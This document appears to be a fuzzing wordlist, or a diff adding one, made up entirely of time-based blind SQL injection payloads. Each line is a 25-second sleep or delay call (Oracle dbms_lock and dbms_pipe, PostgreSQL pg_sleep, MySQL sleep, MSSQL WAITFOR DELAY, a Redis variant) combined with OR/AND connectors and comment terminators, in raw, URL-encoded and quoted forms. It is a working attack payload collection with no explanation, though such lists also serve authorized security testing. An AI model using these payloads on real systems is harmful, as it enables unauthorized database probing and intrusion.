+'+ AND dbms_lock.sleep(25)+-- -'
++ OR dbms_lock.sleep(25)+-- -
+%2B%20AND%20dbms_lock.sleep%2825%29%2B--%20-
+'+ OR dbms_lock.sleep(25)+-- -'
++ AND dbms_lock.sleep(25) -- -
+%2B%20AND%20dbms_lock.sleep%2825%29%20--%20-
+'+ AND dbms_lock.sleep(25) -- -'
++ OR dbms_lock.sleep(25) -- -
+%2B%20OR%20dbms_lock.sleep%2825%29%20--%20-
+'+ OR dbms_lock.sleep(25) -- -'
++ redis.call("TIME")[25] -- -
+%2B%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+%2B+redis.call%28%22TIME%22%29%5B25%5D+--+-
+'+ redis.call("TIME")[25] -- -'
+++redis.call("TIME")[25]+-- -
+%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'++redis.call("TIME")[25]+-- -'
+ OR++redis.call("TIME")[25]+-- -
+%20OR%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' OR++redis.call("TIME")[25]+-- -'
+ AND++redis.call("TIME")[25]+-- -
+%20AND%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+' AND++redis.call("TIME")[25]+-- -'
+ AND+AND redis.call("TIME")[25] -- -
+%20AND%2BAND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++AND%2BAND+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' AND+AND redis.call("TIME")[25] -- -'
+ OR+OR redis.call("TIME")[25] -- -
+%20OR%2BOR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
++OR%2BOR+redis.call%28%22TIME%22%29%5B25%5D+--+-
+' OR+OR redis.call("TIME")[25] -- -'
++ AND redis.call("TIME")[25]+-- -
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'+ AND redis.call("TIME")[25]+-- -'
++ OR redis.call("TIME")[25]+-- -
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%20-
+'+ OR redis.call("TIME")[25]+-- -'
++ AND redis.call("TIME")[25] -- -
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'+ AND redis.call("TIME")[25] -- -'
++ OR redis.call("TIME")[25] -- -
+%2B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%20-
+'+ OR redis.call("TIME")[25] -- -'
++ WAITFOR DELAY '00:00:25' -- -
+%2B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+%2B+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+"+ WAITFOR DELAY '00:00:25' -- -"
+++WAITFOR DELAY '00:00:25'+-- -
+%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"++WAITFOR DELAY '00:00:25'+-- -"
+ OR++WAITFOR DELAY '00:00:25'+-- -
+%20OR%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" OR++WAITFOR DELAY '00:00:25'+-- -"
+ AND++WAITFOR DELAY '00:00:25'+-- -
+%20AND%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+" AND++WAITFOR DELAY '00:00:25'+-- -"
+ AND+AND WAITFOR DELAY '00:00:25' -- -
+%20AND%2BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++AND%2BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" AND+AND WAITFOR DELAY '00:00:25' -- -"
+ OR+OR WAITFOR DELAY '00:00:25' -- -
+%20OR%2BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
++OR%2BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+--+-
+" OR+OR WAITFOR DELAY '00:00:25' -- -"
++ AND WAITFOR DELAY '00:00:25'+-- -
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"+ AND WAITFOR DELAY '00:00:25'+-- -"
++ OR WAITFOR DELAY '00:00:25'+-- -
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%20-
+"+ OR WAITFOR DELAY '00:00:25'+-- -"
++ AND WAITFOR DELAY '00:00:25' -- -
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"+ AND WAITFOR DELAY '00:00:25' -- -"
++ OR WAITFOR DELAY '00:00:25' -- -
+%2B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%20-
+"+ OR WAITFOR DELAY '00:00:25' -- -"
+  pg_sleep(25) --
+%20%20pg_sleep%2825%29%20--
+++pg_sleep%2825%29+--
+'  pg_sleep(25) --'
+ +pg_sleep(25)+--
+%20%2Bpg_sleep%2825%29%2B--
+' +pg_sleep(25)+--'
+ OR +pg_sleep(25)+--
+%20OR%20%2Bpg_sleep%2825%29%2B--
+' OR +pg_sleep(25)+--'
+ AND +pg_sleep(25)+--
+%20AND%20%2Bpg_sleep%2825%29%2B--
+' AND +pg_sleep(25)+--'
+ AND AND pg_sleep(25) --
+%20AND%20AND%20pg_sleep%2825%29%20--
++AND+AND+pg_sleep%2825%29+--
+' AND AND pg_sleep(25) --'
+ OR OR pg_sleep(25) --
+%20OR%20OR%20pg_sleep%2825%29%20--
++OR+OR+pg_sleep%2825%29+--
+' OR OR pg_sleep(25) --'
+  AND pg_sleep(25)+--
+%20%20AND%20pg_sleep%2825%29%2B--
+'  AND pg_sleep(25)+--'
+  OR pg_sleep(25)+--
+%20%20AND%20pg_sleep%2825%29%2B--
+'  OR pg_sleep(25)+--'
+  AND pg_sleep(25) --
+%20%20AND%20pg_sleep%2825%29%20--
+'  AND pg_sleep(25) --'
+  OR pg_sleep(25) --
+%20%20OR%20pg_sleep%2825%29%20--
+'  OR pg_sleep(25) --'
+  dbms_pipe.receive_message(('a'),25) --
+%20%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+++dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+"  dbms_pipe.receive_message(('a'),25) --"
+ +dbms_pipe.receive_message(('a'),25)+--
+%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" +dbms_pipe.receive_message(('a'),25)+--"
+ OR +dbms_pipe.receive_message(('a'),25)+--
+%20OR%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" OR +dbms_pipe.receive_message(('a'),25)+--"
+ AND +dbms_pipe.receive_message(('a'),25)+--
+%20AND%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+" AND +dbms_pipe.receive_message(('a'),25)+--"
+ AND AND dbms_pipe.receive_message(('a'),25) --
+%20AND%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++AND+AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" AND AND dbms_pipe.receive_message(('a'),25) --"
+ OR OR dbms_pipe.receive_message(('a'),25) --
+%20OR%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
++OR+OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--
+" OR OR dbms_pipe.receive_message(('a'),25) --"
+  AND dbms_pipe.receive_message(('a'),25)+--
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"  AND dbms_pipe.receive_message(('a'),25)+--"
+  OR dbms_pipe.receive_message(('a'),25)+--
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--
+"  OR dbms_pipe.receive_message(('a'),25)+--"
+  AND dbms_pipe.receive_message(('a'),25) --
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"  AND dbms_pipe.receive_message(('a'),25) --"
+  OR dbms_pipe.receive_message(('a'),25) --
+%20%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--
+"  OR dbms_pipe.receive_message(('a'),25) --"
+  sleep(25) --
+%20%20sleep%2825%29%20--
+++sleep%2825%29+--
+'  sleep(25) --'
+ +sleep(25)+--
+%20%2Bsleep%2825%29%2B--
+' +sleep(25)+--'
+ OR +sleep(25)+--
+%20OR%20%2Bsleep%2825%29%2B--
+' OR +sleep(25)+--'
+ AND +sleep(25)+--
+%20AND%20%2Bsleep%2825%29%2B--
+' AND +sleep(25)+--'
+ AND AND sleep(25) --
+%20AND%20AND%20sleep%2825%29%20--
++AND+AND+sleep%2825%29+--
+' AND AND sleep(25) --'
+ OR OR sleep(25) --
+%20OR%20OR%20sleep%2825%29%20--
++OR+OR+sleep%2825%29+--
+' OR OR sleep(25) --'
+  AND sleep(25)+--
+%20%20AND%20sleep%2825%29%2B--
+'  AND sleep(25)+--'
+  OR sleep(25)+--
+%20%20AND%20sleep%2825%29%2B--
+'  OR sleep(25)+--'
+  AND sleep(25) --
+%20%20AND%20sleep%2825%29%20--
+'  AND sleep(25) --'
+  OR sleep(25) --
+%20%20OR%20sleep%2825%29%20--
+'  OR sleep(25) --'
+  dbms_lock.sleep(25) --
+%20%20dbms_lock.sleep%2825%29%20--
+++dbms_lock.sleep%2825%29+--
+'  dbms_lock.sleep(25) --'
+ +dbms_lock.sleep(25)+--
+%20%2Bdbms_lock.sleep%2825%29%2B--
+' +dbms_lock.sleep(25)+--'
+ OR +dbms_lock.sleep(25)+--
+%20OR%20%2Bdbms_lock.sleep%2825%29%2B--
+' OR +dbms_lock.sleep(25)+--'
+ AND +dbms_lock.sleep(25)+--
+%20AND%20%2Bdbms_lock.sleep%2825%29%2B--
+' AND +dbms_lock.sleep(25)+--'
+ AND AND dbms_lock.sleep(25) --
+%20AND%20AND%20dbms_lock.sleep%2825%29%20--
++AND+AND+dbms_lock.sleep%2825%29+--
+' AND AND dbms_lock.sleep(25) --'
+ OR OR dbms_lock.sleep(25) --
+%20OR%20OR%20dbms_lock.sleep%2825%29%20--
++OR+OR+dbms_lock.sleep%2825%29+--
+' OR OR dbms_lock.sleep(25) --'
+  AND dbms_lock.sleep(25)+--
+%20%20AND%20dbms_lock.sleep%2825%29%2B--
+'  AND dbms_lock.sleep(25)+--'
+  OR dbms_lock.sleep(25)+--
+%20%20AND%20dbms_lock.sleep%2825%29%2B--
+'  OR dbms_lock.sleep(25)+--'
+  AND dbms_lock.sleep(25) --
+%20%20AND%20dbms_lock.sleep%2825%29%20--
+'  AND dbms_lock.sleep(25) --'
+  OR dbms_lock.sleep(25) --
+%20%20OR%20dbms_lock.sleep%2825%29%20--
+'  OR dbms_lock.sleep(25) --'
+  redis.call("TIME")[25] --
+%20%20redis.call%28%22TIME%22%29%5B25%5D%20--
+++redis.call%28%22TIME%22%29%5B25%5D+--
+'  redis.call("TIME")[25] --'
+ +redis.call("TIME")[25]+--
+%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' +redis.call("TIME")[25]+--'
+ OR +redis.call("TIME")[25]+--
+%20OR%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' OR +redis.call("TIME")[25]+--'
+ AND +redis.call("TIME")[25]+--
+%20AND%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--
+' AND +redis.call("TIME")[25]+--'
+ AND AND redis.call("TIME")[25] --
+%20AND%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
++AND+AND+redis.call%28%22TIME%22%29%5B25%5D+--
+' AND AND redis.call("TIME")[25] --'
+ OR OR redis.call("TIME")[25] --
+%20OR%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
++OR+OR+redis.call%28%22TIME%22%29%5B25%5D+--
+' OR OR redis.call("TIME")[25] --'
+  AND redis.call("TIME")[25]+--
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'  AND redis.call("TIME")[25]+--'
+  OR redis.call("TIME")[25]+--
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--
+'  OR redis.call("TIME")[25]+--'
+  AND redis.call("TIME")[25] --
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'  AND redis.call("TIME")[25] --'
+  OR redis.call("TIME")[25] --
+%20%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--
+'  OR redis.call("TIME")[25] --'
+  WAITFOR DELAY '00:00:25' --
+%20%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+++WAITFOR+DELAY+%2700%3A00%3A25%27+--
+"  WAITFOR DELAY '00:00:25' --"
+ +WAITFOR DELAY '00:00:25'+--
+%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" +WAITFOR DELAY '00:00:25'+--"
+ OR +WAITFOR DELAY '00:00:25'+--
+%20OR%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" OR +WAITFOR DELAY '00:00:25'+--"
+ AND +WAITFOR DELAY '00:00:25'+--
+%20AND%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+" AND +WAITFOR DELAY '00:00:25'+--"
+ AND AND WAITFOR DELAY '00:00:25' --
+%20AND%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++AND+AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" AND AND WAITFOR DELAY '00:00:25' --"
+ OR OR WAITFOR DELAY '00:00:25' --
+%20OR%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
++OR+OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--
+" OR OR WAITFOR DELAY '00:00:25' --"
+  AND WAITFOR DELAY '00:00:25'+--
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"  AND WAITFOR DELAY '00:00:25'+--"
+  OR WAITFOR DELAY '00:00:25'+--
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--
+"  OR WAITFOR DELAY '00:00:25'+--"
+  AND WAITFOR DELAY '00:00:25' --
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"  AND WAITFOR DELAY '00:00:25' --"
+  OR WAITFOR DELAY '00:00:25' --
+%20%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--
+"  OR WAITFOR DELAY '00:00:25' --"
+  pg_sleep(25) --+-
+%20%20pg_sleep%2825%29%20--%2B-
+++pg_sleep%2825%29+--%2B-
+'  pg_sleep(25) --+-'
+ +pg_sleep(25)+--+-
+%20%2Bpg_sleep%2825%29%2B--%2B-
+' +pg_sleep(25)+--+-'
+ OR +pg_sleep(25)+--+-
+%20OR%20%2Bpg_sleep%2825%29%2B--%2B-
+' OR +pg_sleep(25)+--+-'
+ AND +pg_sleep(25)+--+-
+%20AND%20%2Bpg_sleep%2825%29%2B--%2B-
+' AND +pg_sleep(25)+--+-'
+ AND AND pg_sleep(25) --+-
+%20AND%20AND%20pg_sleep%2825%29%20--%2B-
++AND+AND+pg_sleep%2825%29+--%2B-
+' AND AND pg_sleep(25) --+-'
+ OR OR pg_sleep(25) --+-
+%20OR%20OR%20pg_sleep%2825%29%20--%2B-
++OR+OR+pg_sleep%2825%29+--%2B-
+' OR OR pg_sleep(25) --+-'
+  AND pg_sleep(25)+--+-
+%20%20AND%20pg_sleep%2825%29%2B--%2B-
+'  AND pg_sleep(25)+--+-'
+  OR pg_sleep(25)+--+-
+%20%20AND%20pg_sleep%2825%29%2B--%2B-
+'  OR pg_sleep(25)+--+-'
+  AND pg_sleep(25) --+-
+%20%20AND%20pg_sleep%2825%29%20--%2B-
+'  AND pg_sleep(25) --+-'
+  OR pg_sleep(25) --+-
+%20%20OR%20pg_sleep%2825%29%20--%2B-
+'  OR pg_sleep(25) --+-'
+  dbms_pipe.receive_message(('a'),25) --+-
+%20%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+++dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+"  dbms_pipe.receive_message(('a'),25) --+-"
+ +dbms_pipe.receive_message(('a'),25)+--+-
+%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" +dbms_pipe.receive_message(('a'),25)+--+-"
+ OR +dbms_pipe.receive_message(('a'),25)+--+-
+%20OR%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" OR +dbms_pipe.receive_message(('a'),25)+--+-"
+ AND +dbms_pipe.receive_message(('a'),25)+--+-
+%20AND%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+" AND +dbms_pipe.receive_message(('a'),25)+--+-"
+ AND AND dbms_pipe.receive_message(('a'),25) --+-
+%20AND%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++AND+AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" AND AND dbms_pipe.receive_message(('a'),25) --+-"
+ OR OR dbms_pipe.receive_message(('a'),25) --+-
+%20OR%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
++OR+OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--%2B-
+" OR OR dbms_pipe.receive_message(('a'),25) --+-"
+  AND dbms_pipe.receive_message(('a'),25)+--+-
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"  AND dbms_pipe.receive_message(('a'),25)+--+-"
+  OR dbms_pipe.receive_message(('a'),25)+--+-
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%2B-
+"  OR dbms_pipe.receive_message(('a'),25)+--+-"
+  AND dbms_pipe.receive_message(('a'),25) --+-
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"  AND dbms_pipe.receive_message(('a'),25) --+-"
+  OR dbms_pipe.receive_message(('a'),25) --+-
+%20%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%2B-
+"  OR dbms_pipe.receive_message(('a'),25) --+-"
+  sleep(25) --+-
+%20%20sleep%2825%29%20--%2B-
+++sleep%2825%29+--%2B-
+'  sleep(25) --+-'
+ +sleep(25)+--+-
+%20%2Bsleep%2825%29%2B--%2B-
+' +sleep(25)+--+-'
+ OR +sleep(25)+--+-
+%20OR%20%2Bsleep%2825%29%2B--%2B-
+' OR +sleep(25)+--+-'
+ AND +sleep(25)+--+-
+%20AND%20%2Bsleep%2825%29%2B--%2B-
+' AND +sleep(25)+--+-'
+ AND AND sleep(25) --+-
+%20AND%20AND%20sleep%2825%29%20--%2B-
++AND+AND+sleep%2825%29+--%2B-
+' AND AND sleep(25) --+-'
+ OR OR sleep(25) --+-
+%20OR%20OR%20sleep%2825%29%20--%2B-
++OR+OR+sleep%2825%29+--%2B-
+' OR OR sleep(25) --+-'
+  AND sleep(25)+--+-
+%20%20AND%20sleep%2825%29%2B--%2B-
+'  AND sleep(25)+--+-'
+  OR sleep(25)+--+-
+%20%20AND%20sleep%2825%29%2B--%2B-
+'  OR sleep(25)+--+-'
+  AND sleep(25) --+-
+%20%20AND%20sleep%2825%29%20--%2B-
+'  AND sleep(25) --+-'
+  OR sleep(25) --+-
+%20%20OR%20sleep%2825%29%20--%2B-
+'  OR sleep(25) --+-'
+  dbms_lock.sleep(25) --+-
+%20%20dbms_lock.sleep%2825%29%20--%2B-
+++dbms_lock.sleep%2825%29+--%2B-
+'  dbms_lock.sleep(25) --+-'
+ +dbms_lock.sleep(25)+--+-
+%20%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' +dbms_lock.sleep(25)+--+-'
+ OR +dbms_lock.sleep(25)+--+-
+%20OR%20%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' OR +dbms_lock.sleep(25)+--+-'
+ AND +dbms_lock.sleep(25)+--+-
+%20AND%20%2Bdbms_lock.sleep%2825%29%2B--%2B-
+' AND +dbms_lock.sleep(25)+--+-'
+ AND AND dbms_lock.sleep(25) --+-
+%20AND%20AND%20dbms_lock.sleep%2825%29%20--%2B-
++AND+AND+dbms_lock.sleep%2825%29+--%2B-
+' AND AND dbms_lock.sleep(25) --+-'
+ OR OR dbms_lock.sleep(25) --+-
+%20OR%20OR%20dbms_lock.sleep%2825%29%20--%2B-
++OR+OR+dbms_lock.sleep%2825%29+--%2B-
+' OR OR dbms_lock.sleep(25) --+-'
+  AND dbms_lock.sleep(25)+--+-
+%20%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'  AND dbms_lock.sleep(25)+--+-'
+  OR dbms_lock.sleep(25)+--+-
+%20%20AND%20dbms_lock.sleep%2825%29%2B--%2B-
+'  OR dbms_lock.sleep(25)+--+-'
+  AND dbms_lock.sleep(25) --+-
+%20%20AND%20dbms_lock.sleep%2825%29%20--%2B-
+'  AND dbms_lock.sleep(25) --+-'
+  OR dbms_lock.sleep(25) --+-
+%20%20OR%20dbms_lock.sleep%2825%29%20--%2B-
+'  OR dbms_lock.sleep(25) --+-'
+  redis.call("TIME")[25] --+-
+%20%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+++redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+'  redis.call("TIME")[25] --+-'
+ +redis.call("TIME")[25]+--+-
+%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' +redis.call("TIME")[25]+--+-'
+ OR +redis.call("TIME")[25]+--+-
+%20OR%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' OR +redis.call("TIME")[25]+--+-'
+ AND +redis.call("TIME")[25]+--+-
+%20AND%20%2Bredis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+' AND +redis.call("TIME")[25]+--+-'
+ AND AND redis.call("TIME")[25] --+-
+%20AND%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++AND+AND+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' AND AND redis.call("TIME")[25] --+-'
+ OR OR redis.call("TIME")[25] --+-
+%20OR%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
++OR+OR+redis.call%28%22TIME%22%29%5B25%5D+--%2B-
+' OR OR redis.call("TIME")[25] --+-'
+  AND redis.call("TIME")[25]+--+-
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'  AND redis.call("TIME")[25]+--+-'
+  OR redis.call("TIME")[25]+--+-
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B--%2B-
+'  OR redis.call("TIME")[25]+--+-'
+  AND redis.call("TIME")[25] --+-
+%20%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'  AND redis.call("TIME")[25] --+-'
+  OR redis.call("TIME")[25] --+-
+%20%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20--%2B-
+'  OR redis.call("TIME")[25] --+-'
+  WAITFOR DELAY '00:00:25' --+-
+%20%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+++WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+"  WAITFOR DELAY '00:00:25' --+-"
+ +WAITFOR DELAY '00:00:25'+--+-
+%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" +WAITFOR DELAY '00:00:25'+--+-"
+ OR +WAITFOR DELAY '00:00:25'+--+-
+%20OR%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" OR +WAITFOR DELAY '00:00:25'+--+-"
+ AND +WAITFOR DELAY '00:00:25'+--+-
+%20AND%20%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" AND +WAITFOR DELAY '00:00:25'+--+-"
+ AND AND WAITFOR DELAY '00:00:25' --+-
+%20AND%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++AND+AND+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" AND AND WAITFOR DELAY '00:00:25' --+-"
+ OR OR WAITFOR DELAY '00:00:25' --+-
+%20OR%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++OR+OR+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" OR OR WAITFOR DELAY '00:00:25' --+-"
+  AND WAITFOR DELAY '00:00:25'+--+-
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"  AND WAITFOR DELAY '00:00:25'+--+-"
+  OR WAITFOR DELAY '00:00:25'+--+-
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"  OR WAITFOR DELAY '00:00:25'+--+-"
+  AND WAITFOR DELAY '00:00:25' --+-
+%20%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"  AND WAITFOR DELAY '00:00:25' --+-"
+  OR WAITFOR DELAY '00:00:25' --+-
+%20%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"  OR WAITFOR DELAY '00:00:25' --+-"
+  pg_sleep(25) #
+%20%20pg_sleep%2825%29%20%23
+++pg_sleep%2825%29+%23
+'  pg_sleep(25) #'
+ +pg_sleep(25)+#
+%20%2Bpg_sleep%2825%29%2B%23
+' +pg_sleep(25)+#'
+ OR +pg_sleep(25)+#
+%20OR%20%2Bpg_sleep%2825%29%2B%23
+' OR +pg_sleep(25)+#'
+ AND +pg_sleep(25)+#
+%20AND%20%2Bpg_sleep%2825%29%2B%23
+' AND +pg_sleep(25)+#'
+ AND AND pg_sleep(25) #
+%20AND%20AND%20pg_sleep%2825%29%20%23
++AND+AND+pg_sleep%2825%29+%23
+' AND AND pg_sleep(25) #'
+ OR OR pg_sleep(25) #
+%20OR%20OR%20pg_sleep%2825%29%20%23
++OR+OR+pg_sleep%2825%29+%23
+' OR OR pg_sleep(25) #'
+  AND pg_sleep(25)+#
+%20%20AND%20pg_sleep%2825%29%2B%23
+'  AND pg_sleep(25)+#'
+  OR pg_sleep(25)+#
+%20%20AND%20pg_sleep%2825%29%2B%23
+'  OR pg_sleep(25)+#'
+  AND pg_sleep(25) #
+%20%20AND%20pg_sleep%2825%29%20%23
+'  AND pg_sleep(25) #'
+  OR pg_sleep(25) #
+%20%20OR%20pg_sleep%2825%29%20%23
+'  OR pg_sleep(25) #'
+  dbms_pipe.receive_message(('a'),25) #
+%20%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+++dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+"  dbms_pipe.receive_message(('a'),25) #"
+ +dbms_pipe.receive_message(('a'),25)+#
+%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" +dbms_pipe.receive_message(('a'),25)+#"
+ OR +dbms_pipe.receive_message(('a'),25)+#
+%20OR%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" OR +dbms_pipe.receive_message(('a'),25)+#"
+ AND +dbms_pipe.receive_message(('a'),25)+#
+%20AND%20%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" AND +dbms_pipe.receive_message(('a'),25)+#"
+ AND AND dbms_pipe.receive_message(('a'),25) #
+%20AND%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++AND+AND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" AND AND dbms_pipe.receive_message(('a'),25) #"
+ OR OR dbms_pipe.receive_message(('a'),25) #
+%20OR%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++OR+OR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" OR OR dbms_pipe.receive_message(('a'),25) #"
+  AND dbms_pipe.receive_message(('a'),25)+#
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"  AND dbms_pipe.receive_message(('a'),25)+#"
+  OR dbms_pipe.receive_message(('a'),25)+#
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"  OR dbms_pipe.receive_message(('a'),25)+#"
+  AND dbms_pipe.receive_message(('a'),25) #
+%20%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"  AND dbms_pipe.receive_message(('a'),25) #"
+  OR dbms_pipe.receive_message(('a'),25) #
+%20%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"  OR dbms_pipe.receive_message(('a'),25) #"
+  sleep(25) #
+%20%20sleep%2825%29%20%23
+++sleep%2825%29+%23
+'  sleep(25) #'
+ +sleep(25)+#
+%20%2Bsleep%2825%29%2B%23
+' +sleep(25)+#'
+ OR +sleep(25)+#
+%20OR%20%2Bsleep%2825%29%2B%23
+' OR +sleep(25)+#'
+ AND +sleep(25)+#
+%20AND%20%2Bsleep%2825%29%2B%23
+' AND +sleep(25)+#'
+ AND AND sleep(25) #
+%20AND%20AND%20sleep%2825%29%20%23
++AND+AND+sleep%2825%29+%23
+' AND AND sleep(25) #'
+ OR OR sleep(25) #
+%20OR%20OR%20sleep%2825%29%20%23
++OR+OR+sleep%2825%29+%23
+' OR OR sleep(25) #'
+  AND sleep(25)+#
+%20%20AND%20sleep%2825%29%2B%23
+'  AND sleep(25)+#'
+  OR sleep(25)+#
+%20%20AND%20sleep%2825%29%2B%23
+'  OR sleep(25)+#'
+  AND sleep(25) #
+%20%20AND%20sleep%2825%29%20%23
+'  AND sleep(25) #'
+  OR sleep(25) #
+%20%20OR%20sleep%2825%29%20%23
+'  OR sleep(25) #'
+  dbms_lock.sleep(25) #
+%20%20dbms_lock.sleep%2825%29%20%23
+++dbms_lock.sleep%2825%29+%23
+'  dbms_lock.sleep(25) #'
+ +dbms_lock.sleep(25)+#
+%20%2Bdbms_lock.sleep%2825%29%2B%23
+' +dbms_lock.sleep(25)+#'
+ OR +dbms_lock.sleep(25)+#
